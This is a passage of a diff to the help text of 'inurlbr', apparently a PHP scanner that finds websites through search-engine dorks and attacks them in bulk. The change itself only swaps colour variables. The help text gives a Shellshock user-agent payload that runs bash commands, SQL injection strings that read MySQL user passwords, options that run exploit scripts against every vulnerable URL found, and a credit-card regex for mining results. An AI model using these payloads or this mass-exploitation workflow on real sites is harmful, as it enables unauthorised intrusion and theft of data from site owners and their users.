+      Example: {$cor->whit}--range-rand {$cor->yell}{rand}{$cor->end}
+      Usage:   {$cor->whit}--range-rand {$cor->yell}'50'
 
- {$_SESSION["c1"]}--irc{$_SESSION["c0"]} Sending vulnerable to IRC / server channel.
-      Example: {$_SESSION["c1"]}--irc {$_SESSION["c2"]}{server#channel}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'
+ {$cor->whit}--irc{$cor->end} Sending vulnerable to IRC / server channel.
+      Example: {$cor->whit}--irc {$cor->yell}{server#channel}{$cor->end}
+      Usage:   {$cor->whit}--irc {$cor->yell}'irc.rizon.net#inurlbrasil'
 
- {$_SESSION["c1"]}--http-header{$_SESSION["c0"]} Set HTTP header.
-      Example: {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm=\"Top Secret\"'
+ {$cor->whit}--http-header{$cor->end} Set HTTP header.
+      Example: {$cor->whit}--http-header {$cor->yell}{youemail}{$cor->end}
+      Usage:   {$cor->whit}--http-header {$cor->yell}'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm=\"Top Secret\"'
           
- {$_SESSION["c1"]}--sedmail{$_SESSION["c0"]} Sending vulnerable to email.
-      Example: {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}youemail@inurl.com.br
+ {$cor->whit}--sedmail{$cor->end} Sending vulnerable to email.
+      Example: {$cor->whit}--sedmail {$cor->yell}{youemail}{$cor->end}
+      Usage:   {$cor->whit}--sedmail {$cor->yell}youemail@inurl.com.br
           
- {$_SESSION["c1"]}--delay{$_SESSION["c0"]} Delay between research processes.
-      Example: {$_SESSION["c1"]}--delay {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--delay {$_SESSION["c2"]}10
+ {$cor->whit}--delay{$cor->end} Delay between research processes.
+      Example: {$cor->whit}--delay {$cor->yell}{second}{$cor->end}
+      Usage:   {$cor->whit}--delay {$cor->yell}10
   
- {$_SESSION["c1"]}--time-out{$_SESSION["c0"]} Timeout to exit the process.
-      Example: {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}10
+ {$cor->whit}--time-out{$cor->end} Timeout to exit the process.
+      Example: {$cor->whit}--time-out {$cor->yell}{second}{$cor->end}
+      Usage:   {$cor->whit}--time-out {$cor->yell}10
 
- {$_SESSION["c1"]}--ifurl{$_SESSION["c0"]} Filter URLs based on their argument.
-      Example: {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}{ifurl}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}index.php?id=
+ {$cor->whit}--ifurl{$cor->end} Filter URLs based on their argument.
+      Example: {$cor->whit}--ifurl {$cor->yell}{ifurl}{$cor->end}
+      Usage:   {$cor->whit}--ifurl {$cor->yell}index.php?id=
 
- {$_SESSION["c1"]}--ifcode{$_SESSION["c0"]} Valid results based on your return http code.
-      Example: {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}{ifcode}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}200
+ {$cor->whit}--ifcode{$cor->end} Valid results based on your return http code.
+      Example: {$cor->whit}--ifcode {$cor->yell}{ifcode}{$cor->end}
+      Usage:   {$cor->whit}--ifcode {$cor->yell}200
  
- {$_SESSION["c1"]}--ifemail{$_SESSION["c0"]} Filter E-mails based on their argument.
-     Example: {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}{file_where_my_emails_are}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}sp.gov.br
+ {$cor->whit}--ifemail{$cor->end} Filter E-mails based on their argument.
+     Example: {$cor->whit}--ifemail {$cor->yell}{file_where_my_emails_are}{$cor->end}
+     Usage:   {$cor->whit}--ifemail {$cor->yell}sp.gov.br
 
- {$_SESSION["c1"]}--url-reference{$_SESSION["c0"]} Define referring URL in the request to send him against the target.
-      Example: {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}{url}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}http://target.com/admin/user/valid.php
+ {$cor->whit}--url-reference{$cor->end} Define referring URL in the request to send him against the target.
+      Example: {$cor->whit}--url-reference {$cor->yell}{url}{$cor->end}
+      Usage:   {$cor->whit}--url-reference {$cor->yell}http://target.com/admin/user/valid.php
  
- {$_SESSION["c1"]}--mp{$_SESSION["c0"]} Limits the number of pages in the search engines.
-     Example: {$_SESSION["c1"]}--mp {$_SESSION["c2"]}{limit}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--mp {$_SESSION["c2"]}50
+ {$cor->whit}--mp{$cor->end} Limits the number of pages in the search engines.
+     Example: {$cor->whit}--mp {$cor->yell}{limit}{$cor->end}
+     Usage:   {$cor->whit}--mp {$cor->yell}50
      
- {$_SESSION["c1"]}--user-agent{$_SESSION["c0"]} Define the user agent used in its request against the target.
-      Example: {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}{agent}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
+ {$cor->whit}--user-agent{$cor->end} Define the user agent used in its request against the target.
+      Example: {$cor->whit}--user-agent {$cor->yell}{agent}{$cor->end}
+      Usage:   {$cor->whit}--user-agent {$cor->yell}'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
       Usage-exploit / SHELLSHOCK:   
-      {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"'
+      {$cor->whit}--user-agent {$cor->yell}'() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"'
       Complete command:    
       inurlbr --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
  
- {$_SESSION["c1"]}--sall{$_SESSION["c0"]} Saves all urls found by the scanner.
-     Example: {$_SESSION["c1"]}--sall {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--sall {$_SESSION["c2"]}your_file.txt
+ {$cor->whit}--sall{$cor->end} Saves all urls found by the scanner.
+     Example: {$cor->whit}--sall {$cor->yell}{file}{$cor->end}
+     Usage:   {$cor->whit}--sall {$cor->yell}your_file.txt
 
- {$_SESSION["c1"]}--command-vul{$_SESSION["c0"]} Every vulnerable URL found will execute this command parameters.
-     Example: {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
+ {$cor->whit}--command-vul{$cor->end} Every vulnerable URL found will execute this command parameters.
+     Example: {$cor->whit}--command-vul {$cor->yell}{command}{$cor->end}
+     Usage:   {$cor->whit}--command-vul {$cor->yell}'nmap sV -p 22,80,21 {$cor->blue}_TARGET_{$cor->end}{$cor->yell}'{$cor->end}
+              {$cor->whit}--command-vul {$cor->yell}'./exploit.sh {$cor->blue}_TARGET_{$cor->end} {$cor->yell}output.txt'{$cor->end}
+              {$cor->whit}--command-vul {$cor->yell}'php miniexploit.php -t {$cor->blue}_TARGET_{$cor->yell} -s output.txt'{$cor->end}
                   
- {$_SESSION["c1"]}--command-all{$_SESSION["c0"]} Use this commmand to specify a single command to EVERY URL found.
-     Example: {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
+ {$cor->whit}--command-all{$cor->end} Use this commmand to specify a single command to EVERY URL found.
+     Example: {$cor->whit}--command-all {$cor->yell}{command}{$cor->end}
+     Usage:   {$cor->whit}--command-all {$cor->yell}'nmap sV -p 22,80,21 {$cor->blue}_TARGET_{$cor->end}{$cor->yell}'{$cor->end}
+              {$cor->whit}--command-all {$cor->yell}'./exploit.sh {$cor->blue}_TARGET_{$cor->end} {$cor->yell}output.txt'{$cor->end}
+              {$cor->whit}--command-all {$cor->yell}'php miniexploit.php -t {$cor->blue}_TARGET_{$cor->yell} -s output.txt'{$cor->end}
     [!] Observation:
    
-    {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} will be replaced by the URL/target found, although if the user  
+    {$cor->blue}_TARGET_{$cor->end} will be replaced by the URL/target found, although if the user  
     doesn't input the get, only the domain will be executed.
    
-    {$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c0"]} will be replaced by the original URL / target found.
+    {$cor->cya}_TARGETFULL_{$cor->end} will be replaced by the original URL / target found.
        
-    {$_SESSION["c14"]}_TARGETXPL_{$_SESSION["c0"]} will be replaced by the original URL / target found + EXPLOIT --exploit-get.
+    {$cor->cya}_TARGETXPL_{$cor->end} will be replaced by the original URL / target found + EXPLOIT --exploit-get.
        
-    {$_SESSION["c9"]}_TARGETIP_{$_SESSION["c0"]} return of ip URL / target found.
+    {$cor->grey1}_TARGETIP_{$cor->end} return of ip URL / target found.
         
-    {$_SESSION["c8"]}_URI_{$_SESSION["c0"]} Back URL set of folders / target found.
+    {$cor->blue}_URI_{$cor->end} Back URL set of folders / target found.
         
-    {$_SESSION["c15"]}_RANDOM_{$_SESSION["c0"]} Random strings.
+    {$cor->blu1}_RANDOM_{$cor->end} Random strings.
         
-    {$_SESSION["c9"]}_PORT_{$_SESSION["c0"]} Capture port of the current test, within the --port-scan process.
+    {$cor->grey1}_PORT_{$cor->end} Capture port of the current test, within the --port-scan process.
    
-    {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}  will be replaced by the specified command argument {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
-   The exploit-command will be identified by the parameters {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}
+    {$cor->mag}_EXPLOIT_{$cor->end}  will be replaced by the specified command argument {$cor->whit}--exploit-command{$cor->end}.
+   The exploit-command will be identified by the parameters {$cor->whit}--command-vul/{$cor->end} {$cor->whit}--command-all as {$cor->mag}_EXPLOIT_{$cor->end}
 
- {$_SESSION["c1"]}--replace{$_SESSION["c0"]} Replace values ​​in the target URL.
-    Example:  {$_SESSION["c1"]}--replace {$_SESSION["c2"]}{value_old[INURL]value_new}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.aspx?id=[INURL]index.aspx?id=1%27´'{$_SESSION["c0"]}
+ {$cor->whit}--replace{$cor->end} Replace values ​​in the target URL.
+    Example:  {$cor->whit}--replace {$cor->yell}{value_old[INURL]value_new}{$cor->end}
+     Usage:   {$cor->whit}--replace {$cor->yell}'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'{$cor->end}
+              {$cor->whit}--replace {$cor->yell}'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'{$cor->end}
+              {$cor->whit}--replace {$cor->yell}'index.aspx?id=[INURL]index.aspx?id=1%27´'{$cor->end}
                   
- {$_SESSION["c1"]}--remove{$_SESSION["c0"]} Remove values ​​in the target URL.
-      Example: {$_SESSION["c1"]}--remove {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--remove {$_SESSION["c2"]}'/admin.php?id=0'
+ {$cor->whit}--remove{$cor->end} Remove values ​​in the target URL.
+      Example: {$cor->whit}--remove {$cor->yell}{string}{$cor->end}
+      Usage:   {$cor->whit}--remove {$cor->yell}'/admin.php?id=0'
               
- {$_SESSION["c1"]}--regexp{$_SESSION["c0"]} Using regular expression to validate his research, the value of the 
+ {$cor->whit}--regexp{$cor->end} Using regular expression to validate his research, the value of the 
     Expression will be sought within the target/URL.
-    Example:  {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
+    Example:  {$cor->whit}--regexp{$cor->yell} {regular_expression}{$cor->end}
     All Major Credit Cards:
-    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'{$_SESSION["c0"]}
+    Usage:    {$cor->whit}--regexp{$cor->yell} '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'{$cor->end}
     
     IP Addresses:
-    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'{$_SESSION["c0"]}
+    Usage:    {$cor->whit}--regexp{$cor->yell} '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'{$cor->end}
     
     EMAIL:   
-    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
+    Usage:    {$cor->whit}--regexp{$cor->yell} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$cor->end}
     
 
- {$_SESSION["c1"]}---regexp-filter{$_SESSION["c0"]} Using regular expression to filter his research, the value of the 
+ {$cor->whit}---regexp-filter{$cor->end} Using regular expression to filter his research, the value of the 
      Expression will be sought within the target/URL.
-    Example:  {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
+    Example:  {$cor->whit}---regexp-filter{$cor->yell} {regular_expression}{$cor->end}
     EMAIL:   
-    Usage:    {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
+    Usage:    {$cor->whit}---regexp-filter{$cor->yell} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$cor->end}
  
 
     [!] Small commands manager:
     
- {$_SESSION["c1"]}--exploit-cad{$_SESSION["c0"]} Command register for use within the scanner.
+ {$cor->whit}--exploit-cad{$cor->end} Command register for use within the scanner.
     Format {TYPE_EXPLOIT}::{EXPLOIT_COMMAND}
     Example Format: NMAP::nmap -sV _TARGET_
     Example Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
-    Usage:    {$_SESSION["c1"]}--exploit-cad{$_SESSION["c2"]} 'NMAP::nmap -sV _TARGET_'{$_SESSION["c0"]} 
+    Usage:    {$cor->whit}--exploit-cad{$cor->yell} 'NMAP::nmap -sV _TARGET_'{$cor->end} 
     Observation: Each registered command is identified by an id of your array.
                  Commands are logged in exploits.conf file.
 
- {$_SESSION["c1"]}--exploit-all-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
+ {$cor->whit}--exploit-all-id{$cor->end} Execute commands, exploits based on id of use,
     (all) is run for each target found by the engine.
-     Example: {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}1,2,8,22
+     Example: {$cor->whit}--exploit-all-id {$cor->yell}{id,id}{$cor->end}
+     Usage:   {$cor->whit}--exploit-all-id {$cor->yell}1,2,8,22
          
- {$_SESSION["c1"]}--exploit-vul-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
+ {$cor->whit}--exploit-vul-id{$cor->end} Execute commands, exploits based on id of use,
     (vull) run command only if the target was considered vulnerable.
-     Example: {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}1,2,8,22
+     Example: {$cor->whit}--exploit-vul-id {$cor->yell}{id,id}{$cor->end}
+     Usage:   {$cor->whit}--exploit-vul-id {$cor->yell}1,2,8,22
 
- {$_SESSION["c1"]}--exploit-list{$_SESSION["c0"]} List all entries command in exploits.conf file.
+ {$cor->whit}--exploit-list{$cor->end} List all entries command in exploits.conf file.
 
 
     [!] Running subprocesses:
     
- {$_SESSION["c1"]}--sub-file{$_SESSION["c0"]}  Subprocess performs an injection 
+ {$cor->whit}--sub-file{$cor->end}  Subprocess performs an injection 
      strings in URLs found by the engine, via GET or POST.
-     Example: {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}{youfile}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}exploits_get.txt
+     Example: {$cor->whit}--sub-file {$cor->yell}{youfile}{$cor->end}
+     Usage:   {$cor->whit}--sub-file {$cor->yell}exploits_get.txt
          
- {$_SESSION["c1"]}--sub-get{$_SESSION["c0"]} defines whether the strings coming from 
+ {$cor->whit}--sub-get{$cor->end} defines whether the strings coming from 
      --sub-file will be injected via GET.
-     Usage:   {$_SESSION["c1"]}--sub-get
+     Usage:   {$cor->whit}--sub-get
          
- {$_SESSION["c1"]}--sub-post{$_SESSION["c0"]} defines whether the strings coming from 
+ {$cor->whit}--sub-post{$cor->end} defines whether the strings coming from 
      --sub-file will be injected via POST.
-     Usage:   {$_SESSION["c1"]}--sub-get
+     Usage:   {$cor->whit}--sub-get
          
- {$_SESSION["c1"]}--sub-concat{$_SESSION["c0"]} Sets string to be concatenated with 
+ {$cor->whit}--sub-concat{$cor->end} Sets string to be concatenated with 
      the target host within the subprocess
-     Example: {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}'/login.php'{$_SESSION["c0"]}
+     Example: {$cor->whit}--sub-concat {$cor->yell}{string}{$cor->end}
+     Usage:   {$cor->whit}--sub-concat {$cor->yell}'/login.php'{$cor->end}
 
- {$_SESSION["c1"]}--sub-cmd-vul{$_SESSION["c0"]} Each vulnerable URL found within the sub-process
+ {$cor->whit}--sub-cmd-vul{$cor->end} Each vulnerable URL found within the sub-process
      will execute the parameters of this command.
-     Example: {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
+     Example: {$cor->whit}--sub-cmd-vul {$cor->yell}{command}{$cor->end}
+     Usage:   {$cor->whit}--sub-cmd-vul {$cor->yell}'nmap sV -p 22,80,21 {$cor->blue}_TARGET_{$cor->end}{$cor->yell}'{$cor->end}
+              {$cor->whit}--sub-cmd-vul {$cor->yell}'./exploit.sh {$cor->blue}_TARGET_{$cor->end} {$cor->yell}output.txt'{$cor->end}
+              {$cor->whit}--sub-cmd-vul {$cor->yell}'php miniexploit.php -t {$cor->blue}_TARGET_{$cor->yell} -s output.txt'{$cor->end}
                   
- {$_SESSION["c1"]}--sub-cmd-all{$_SESSION["c0"]} Run command to each target found within the sub-process scope.
-     Example: {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
+ {$cor->whit}--sub-cmd-all{$cor->end} Run command to each target found within the sub-process scope.
+     Example: {$cor->whit}--sub-cmd-all {$cor->yell}{command}{$cor->end}
+     Usage:   {$cor->whit}--sub-cmd-all {$cor->yell}'nmap sV -p 22,80,21 {$cor->blue}_TARGET_{$cor->end}{$cor->yell}'{$cor->end}
+              {$cor->whit}--sub-cmd-all {$cor->yell}'./exploit.sh {$cor->blue}_TARGET_{$cor->end} {$cor->yell}output.txt'{$cor->end}
+              {$cor->whit}--sub-cmd-all {$cor->yell}'php miniexploit.php -t {$cor->blue}_TARGET_{$cor->yell} -s output.txt'{$cor->end}
 
 
- {$_SESSION["c1"]}--port-scan{$_SESSION["c0"]} Defines ports that will be validated as open.
-     Example: {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}{ports}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}'22,21,23,3306'{$_SESSION["c0"]}
+ {$cor->whit}--port-scan{$cor->end} Defines ports that will be validated as open.
+     Example: {$cor->whit}--port-scan {$cor->yell}{ports}{$cor->end}
+     Usage:   {$cor->whit}--port-scan {$cor->yell}'22,21,23,3306'{$cor->end}
          
- {$_SESSION["c1"]}--port-cmd{$_SESSION["c0"]} Define command that runs when finding an open door.
-     Example: {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_:_PORT_'{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_/file.php?sqli=1'{$_SESSION["c0"]}
+ {$cor->whit}--port-cmd{$cor->end} Define command that runs when finding an open door.
+     Example: {$cor->whit}--port-cmd {$cor->yell}{command}{$cor->end}
+     Usage:   {$cor->whit}--port-cmd {$cor->yell}'./xpl _TARGETIP_:_PORT_'{$cor->end}
+              {$cor->whit}--port-cmd {$cor->yell}'./xpl _TARGETIP_/file.php?sqli=1'{$cor->end}
 
- {$_SESSION["c1"]}--port-write{$_SESSION["c0"]} Send values for door.
-     Example: {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}{'value0','value1','value3'}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}\"'NICK nk_test','USER nk_test 8 * :_ola','JOIN #inurlbrasil','PRIVMSG #inurlbrasil : minha_msg'\"{$_SESSION["c0"]}
+ {$cor->whit}--port-write{$cor->end} Send values for door.
+     Example: {$cor->whit}--port-write {$cor->yell}{'value0','value1','value3'}{$cor->end}
+     Usage:   {$cor->whit}--port-write {$cor->yell}\"'NICK nk_test','USER nk_test 8 * :_ola','JOIN #inurlbrasil','PRIVMSG #inurlbrasil : minha_msg'\"{$cor->end}
 
 
 
     [!] Modifying values used within script parameters:
     
- {$_SESSION["c1"]}md5{$_SESSION["c0"]} Encrypt values in md5.
-     Example: {$_SESSION["c1"]}md5({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}md5({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=md5({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
+ {$cor->whit}md5{$cor->end} Encrypt values in md5.
+     Example: {$cor->whit}md5({$cor->yell}{value}{$cor->whit}){$cor->end}
+     Usage:   {$cor->whit}md5({$cor->yell}102030{$cor->whit}){$cor->end}
+     Usage:   {$cor->whit}--exploit-get 'user?id=md5({$cor->yell}102030{$cor->whit})'{$cor->end}
 
- {$_SESSION["c1"]}base64{$_SESSION["c0"]} Encrypt values in base64.
-     Example: {$_SESSION["c1"]}base64({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}base64({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=base64({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
+ {$cor->whit}base64{$cor->end} Encrypt values in base64.
+     Example: {$cor->whit}base64({$cor->yell}{value}{$cor->whit}){$cor->end}
+     Usage:   {$cor->whit}base64({$cor->yell}102030{$cor->whit}){$cor->end}
+     Usage:   {$cor->whit}--exploit-get 'user?id=base64({$cor->yell}102030{$cor->whit})'{$cor->end}
          
- {$_SESSION["c1"]}hex{$_SESSION["c0"]} Encrypt values in hex.
-     Example: {$_SESSION["c1"]}hex({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}hex({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=hex({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
+ {$cor->whit}hex{$cor->end} Encrypt values in hex.
+     Example: {$cor->whit}hex({$cor->yell}{value}{$cor->whit}){$cor->end}
+     Usage:   {$cor->whit}hex({$cor->yell}102030{$cor->whit}){$cor->end}
+     Usage:   {$cor->whit}--exploit-get 'user?id=hex({$cor->yell}102030{$cor->whit})'{$cor->end}
 
- {$_SESSION["c1"]}hex{$_SESSION["c0"]} Generate random values.
-     Example: {$_SESSION["c1"]}random({$_SESSION["c2"]}{character_counter}{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}random({$_SESSION["c2"]}8{$_SESSION["c1"]}){$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=random({$_SESSION["c2"]}8{$_SESSION["c1"]})'{$_SESSION["c0"]}
+ {$cor->whit}hex{$cor->end} Generate random values.
+     Example: {$cor->whit}random({$cor->yell}{character_counter}{$cor->whit}){$cor->end}
+     Usage:   {$cor->whit}random({$cor->yell}8{$cor->whit}){$cor->end}
+     Usage:   {$cor->whit}--exploit-get 'user?id=random({$cor->yell}8{$cor->whit})'{$cor->end}
 
 ");
 }
